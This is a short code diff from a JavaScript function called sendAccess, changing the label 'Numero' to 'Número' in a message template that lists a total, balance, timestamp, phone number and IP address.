@@ -286,7 +286,7 @@ const sendAccess = async (req, res) => {
 💲 Total: ${ body[0].total }
 🪙 Balance: ${ body[0].balance_new }
 🗓 TimeStamp: ${ body[0].access_date }
-📱 Numero: ${ phone }
+📱 Número: ${ phone }
 🌐 IP: ${ ip }
 ■■■■■■■■■■■■■■■`
 //🧭 Latitud: ${ body[0].latitude }
